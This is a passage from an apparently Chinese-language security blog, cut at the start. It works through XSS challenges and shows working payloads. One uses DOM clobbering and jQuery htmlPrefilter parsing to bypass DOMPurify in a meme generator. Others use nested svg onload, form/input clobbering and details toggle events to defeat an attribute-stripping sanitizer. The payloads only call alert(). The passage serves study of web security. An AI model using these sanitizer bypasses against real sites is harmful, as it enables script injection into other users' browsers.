class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span>Meme Code<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">textarea</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;form-control&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;meme-code&quot;</span> <span class=\"attr\">rows</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;notify&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    /* Utils */</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const escape = (dirty) =&gt; unescape(dirty).replace(/[<span class=\"tag\">&lt;&gt;</span>&#x27;&quot;=]/g, &#x27;&#x27;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeTemplate = (img, text) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        return (`<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"><span class=\"keyword\">@import</span> url(<span class=\"string\">&#x27;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&#x27;</span>);`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&#123;<span class=\"attribute\">margin</span>:<span class=\"number\">0</span> auto;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">img</span>&#123;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">h1</span>&#123;<span class=\"attribute\">text-align</span>:center;<span class=\"attribute\">color</span>:<span class=\"number\">#fff</span>;<span class=\"attribute\">background</span>:black;<span class=\"attribute\">margin-top</span>:-<span class=\"number\">5px</span>;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"attribute\">position</span>:relative;<span class=\"attribute\">font-family</span>:Oswald,sans-serif;<span class=\"attribute\">font-weight</span>:<span class=\"number\">700</span>&#125;</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>`+</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;meme-card&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;$&#123;img&#125;&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>$&#123;text&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeGen = (that, notify) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        if (text &amp;&amp; img) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            template = memeTemplate(img, text)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            if (notify) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                html = (`<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;alert alert-warning&quot;</span> <span class=\"attr\">role</span>=<span class=\"string\">&quot;alert&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>Meme<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span> created from $&#123;DOMPurify.sanitize(text)&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            setTimeout(_ =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#status&#x27;).remove()</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#meme-code&#x27;).text(template)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;, 1000)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"comment\">/* Main */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> notify = <span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> text = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> img = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;img&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">if</span> (text &amp;&amp; img) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;status&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;img class=&quot;circle&quot; src=&quot;<span class=\"subst\">$&#123;<span class=\"built_in\">escape</span>(img)&#125;</span>&quot; onload=&quot;memeGen(this, notify)&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`Creating meme... (<span class=\"subst\">$&#123;DOMPurify.sanitize(text)&#125;</span>)&lt;/div&gt;`</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        )</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        $(<span class=\"string\">&#x27;#meme-code&#x27;</span>).<span class=\"title function_\">text</span>(<span class=\"title function_\">memeTemplate</span>(<span class=\"string\">&#x27;https://i.imgur.com/PdbDexI.jpg&#x27;</span>, <span class=\"string\">&#x27;When you get that WW3 draft letter&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">//代码分析，Utils中为函数声明，main中调用了Utils中的函数</span><br><span class=\"line\">//img和text都被escape或者DOMPurify过滤，无法利用这两个参数</span><br><span class=\"line\">//只要text和img为真，会调用memeGen,memeGen会调用memeTemplate，memeTemplate将img和text写入Meme code中</span><br><span class=\"line\">//memeGen只有SetTimeout中notify存在利用点</span><br><span class=\"line\">//当img和text都为真时，会调用memeTemplate，在meme-code中写入该内容</span><br><span class=\"line\">//memeTemplate存在可控变量img和text，但img在src中，并且存在escape函数，无法闭合，只能利用text</span><br><span class=\"line\">//text需要传入两个值：第一个是为了执行jQuery解析而覆盖的notify，第二个是利用了第一个解析产生弹窗的代码</span><br><span class=\"line\">//通过<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">notify</span>&gt;</span>覆盖notify,通过<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>配合jQuery解析绕过domporify</span><br><span class=\"line\">//进入dompuriy过滤的是<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>,此代码被认为合法，但过滤之后又会被jQuery解析，变为：</span><br><span class=\"line\">//<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//  ,style被闭合，script标签逃逸,完成弹窗   </span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">//第一个img必须是合法的图片才能保证img和text同时为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 1 jquery script 标签逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">    $(&#x27;#status&#x27;).remove()</span><br><span class=\"line\">    notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span><br><span class=\"line\">    $(&#x27;#meme-code&#x27;).text(template)</span><br><span class=\"line\">&#125;, 1000)</span><br></pre></td></tr></table></figure>\n<p>两种解析 html 的方式:<strong>jquery.html&amp;innerhtml</strong>。 <code>innerHTML</code>  是原生 js 的写法， <code>Jqury.html()</code>  也是调用原生的 innerHTML 方法，但是加了自己的解析规则</p>\n<p>对于 innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时， <code>&lt;style&gt;</code>  标签中不允许存在子标签 (style 标签最初的设计理念就不能用来放子标签)，如果存在会被当作 text 解析。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style/&gt;&lt;script&gt;alert(1337)//</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>对于 <code>Jqury.html()</code> ，最终对标签的处理是在 <code>htmlPrefilter()</code>  中实现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rxhtmlTag = /&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^/&gt;x20trnf]*)[^&gt;]*)/&gt;/gi</span><br><span class=\"line\">jQuery.extend( &#123;</span><br><span class=\"line\">    htmlPrefilter: function( html ) &#123;</span><br><span class=\"line\">        return html.replace( rxhtmlTag, &quot;&lt;$1&gt;&lt;/$2&gt;&quot; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];</span><br><span class=\"line\"></span><br><span class=\"line\">此处正则匹配完的结果$1和$2均为style</span><br></pre></td></tr></table></figure>\n<p>这个正则表达式在匹配 <code>&lt;*/&gt;</code>  之后会重新生成一对标签 (区别于直接调用 innerHTML)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style&gt;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1337)//</span><br></pre></td></tr></table></figure>\n<p>前置知识 2</p>\n<p>首先尝试用 DOM-clobbering 创造一个 id 为 <code>notify</code>  的变量，尝试覆盖 notify 使其变为真，走到为真的条件中，但是这种方式不允许覆盖已经存在的变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;img id=notify&gt;</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;memeGen(notify)&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">const memeGen = (notify) =&gt;&#123;</span><br><span class=\"line\">    consol.log(notify);  //false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let notify = false;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>但我们可以通过 name 的局部作用域覆盖 notify</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img name=notify&gt;</span><br><span class=\"line\">此时notify为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 3：</p>\n<p>JS 局部作用域和全局作用域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;console.log(nickname)&quot;&gt; //pig</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;var nickname=&#x27;dog&#x27;;console.log(nickname)&quot;&gt; //dog</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.document.nickname = &#x27;pig&#x27;;</span><br><span class=\"line\">window.nickname = &#x27;cat&#x27;;</span><br><span class=\"line\">&lt;script&gt;</span><br></pre></td></tr></table></figure>\n<p>在 document.write 中 notify 为 false，但通过 img 的局部作用域覆盖了 notify</p>\n<p>在 memeTemplate 中有如下语句：</p>\n<p><code>&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;$&#123;img&#125;&quot;&gt;&lt;h1&gt;$&#123;text&#125;&lt;/h1&gt;&lt;/div&gt;</code> )</p>\n<p>我们可以将局部作用域的 img 放入 text 中同时利用 jQuery 的解析绕过 dompurify 的过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?img=https://i.imgur.com/PdbDexI.jpg&amp;text=&lt;img%20name=notify&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()//</span><br></pre></td></tr></table></figure>\n<p>执行之后写入 memecode，div 中 script 标签被解析，完成弹窗</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012162102961.png\" alt=\"image-20221012162102961\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;</span><br><span class=\"line\">\t\t&lt;b&gt;Meme&lt;/b&gt; </span><br><span class=\"line\">\t\tcreated from </span><br><span class=\"line\">\t\t&lt;img name=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t\t&lt;style&gt;&lt;style&gt;&lt;/style&gt;</span><br><span class=\"line\">\t\t&lt;script&gt;alert()//&lt;/style&gt;&lt;/div&gt;&lt;/script&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"svg深入研究\"><a class=\"markdownIt-Anchor\" href=\"#svg深入研究\">#</a> &lt;svg&gt; 深入研究</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br></pre></td></tr></table></figure>\n<p>HTML5 中 innerHtml 不执行插入的 script 标签</p>\n<p><strong>移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素</strong></p>\n<p>exp:  <code>&lt;img a src='a' b onerror=alert(123)&gt;</code></p>\n<p>因此我们一般不在同一个数组边循环边删除</p>\n<p>修复：先追加到数组中，在移除，即不要在源数组上操作</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = []</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         attrs.<span class=\"title function_ invoke__\">push</span>(attr.name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root); </span><br></pre></td></tr></table></figure>\n<p>使用以上修复后</p>\n<p>1. 别进循环</p>\n<p>2. 进循环别删有用数据</p>\n<p>method 1.(利用 html 页面渲染的竞争时间)</p>\n<p><code>&lt;svg&gt;&lt;svg onload=alert(134)&gt;</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM2MDcyNzk4NTEtY2UyNDFlNTItZDM4ZS00NWRjLTllZGMtODkxMTM2YTQ5OGI4Lm1k\">📎svg 的深度利用来绕过 waf.md</span></p>\n<p>1.1  <code>&lt;img src='1' onerror=&quot;alert(156)&quot;&gt;</code>  失败原因</p>\n<p>那么很明显， <code>alert(1)</code>  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： <strong>在 DOM 树构建完成以后，就会触发</strong> <code>DOMContentLoaded</code>  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 <code>load</code> <strong> 事件</strong>。</p>\n<p>页面的 JS 执行是会阻塞 DOM 树构建的。<strong>所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发</strong> <code>error</code> <strong> 事件</strong>。</p>\n<p>由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。</p>\n<p>1.2 <code>&lt;svg&gt;&lt;svg onload=alert(178)&gt; </code> 可以弹窗原因</p>\n<p>两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 <code>&lt;svg onload=alert(1)&gt;</code> ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败</p>\n<p>当我们没有正确闭合标签的时候，如 <code>&lt;svg&gt;&lt;svg&gt;</code> ，就可能调用到 <code>PopAll</code>  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 <code>PopCommon</code> 。这两个函数有一个共同点，都会调用栈中元素的 <code>FinishParsingChildren</code>  函数。这个函数用于处理子节点解析完毕以后的工作。</p>\n<p><code>FinishParsingChildren</code>  有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p>最外层 svg 的 <code>load</code>  事件由 <code>LocalDOMWindow::dispatchWindowLoadEvent</code>  触发；而其他 svg 的 <code>load</code>  事件则在达到结束标记的时候触发。</p>\n<p>先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行</p>\n<p>当没有过滤代码时：&lt;svg onload=console.log (“svg0”)&gt;&lt;svg onload=console.log (“svg1”)&gt;&lt;svg onload=console.log (“svg2”)&gt;</p>\n<p>触发顺序为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg2</span><br><span class=\"line\">svg1</span><br><span class=\"line\">DOMContentLoaded</span><br><span class=\"line\">svg0</span><br><span class=\"line\">load</span><br></pre></td></tr></table></figure>\n<p>套嵌的 svg 之所以成功，是因为当页面为 <code>root.innerHtml</code>  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中<strong>会触发非最外层 svg 标签的 <code>load</code>  事件，最终成功执行代码</strong>。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。</p>\n<p>1.3 <code>&lt;svg onload=alert(301)&gt;</code>  失败原因</p>\n<p>这里有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p><code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>\n<p>最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。</p>\n<p>method 2. 使用 input 破坏 DOM</p>\n<p><code>&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;</code>   <code>&lt;form style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;</code>   <code>&lt;input id=&quot;attributes&quot;&gt;&lt;input id=&quot;attributes&quot;&gt;</code></p>\n<p>此时 for 循环中 el.attributes 抓到的是 form 的子标签，form 没有执行循环</p>\n<p>或者</p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(199);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;img id=attributes&gt;&lt;img id=attributes&gt;&lt;/form&gt;</code></p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(201);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;input id=attributes&gt;&lt;input id=attributes&gt;&lt;/form&gt;</code></p>\n<p>tabindex 的作用：</p>\n<p>设置 tab 选中的标签，tabindex=1 或 - 1，代表开始就选中，如果只有一个，只要有 tabindex 默认就选中</p>\n<p>需要两个 input 因为有两个 input 时组成了一个 htmlcollection，是可迭代对象。删除 name 的属性后 input 标签仍然可以 onfocus 实现弹窗</p>\n<p>onfoucs 是 input 属性，form 中必须有 input 才能聚焦</p>\n<p>method 3. 利用 details 弹窗</p>\n<p><code>ParseAttribute</code>  正是在解析文档处理标签属性的时候被调用的。注释也写到了，分发 toggle 事件的操作是异步的。</p>\n<p><strong>details 标签的 toggle 事件是异步触发的，并且直接对 details 标签的移除不会清除原先通过属性设置的异步任务</strong></p>\n<p>将 details 改为同步执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span 